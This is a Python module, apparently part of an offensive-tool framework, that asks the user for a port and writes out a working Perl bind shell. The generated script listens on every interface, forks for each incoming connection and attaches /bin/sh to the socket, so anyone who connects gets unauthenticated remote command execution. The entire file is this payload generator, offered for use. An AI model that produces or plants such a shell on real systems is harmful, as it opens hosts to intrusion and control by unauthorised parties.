"""
perl_bind_shell.py - A simple bind shell in perl

Author: Levi Nachamni (levi0x0)
Date: 27/05/2014
Version: 0.2
License: GPL 3

Description:
	A Simple bind shell in perl

"""
import os
import sys
from api.std import *

MODULE_NAME = "Perl Bind shell"
MODULE_AUTHOR = "Levi Nachamni (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.2"
MODULE_DESC = "A Simple perl bind shell module"

class perl_shell(object):
	"""perl_shell method"""
	
	def __init__(self, code,perl_file):
		
		self.perl_code = code
		self.perl_file = perl_file
		
	def make_file(self):
		self.perl = open(self.perl_file, 'w')
		self.perl.write(self.perl_code)
		self.perl.close()
		notify("[+]Done Saved: %s" % (self.perl_file))

os_slash = "/"

perl_code = """
#!/usr/bin/perl
use Socket;
$port = %d;
#open tcp/IPv4 socket
socket (S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt (S, SOL_SOCKET, SO_REUSEADDR,1);
bind (S, sockaddr_in ($port, INADDR_ANY));
listen (S, 50);
while (1){
accept (X, S);
if (!($pid = fork()))
{
if(!defined $pid){exit(0);
}
open STDIN,"<&X";
open STDOUT,">&X";
open STDERR,">&X";
exec("/bin/sh");
close X;}}
"""

def main():
	port = int(raw_input("* Port:"))
	code = perl_code %(port)
	perl_file = "%s%soutput%s%s.pl" % (home,os_slash,os_slash,random_string(4))
	start = perl_shell(code, perl_file)
	start.make_file()
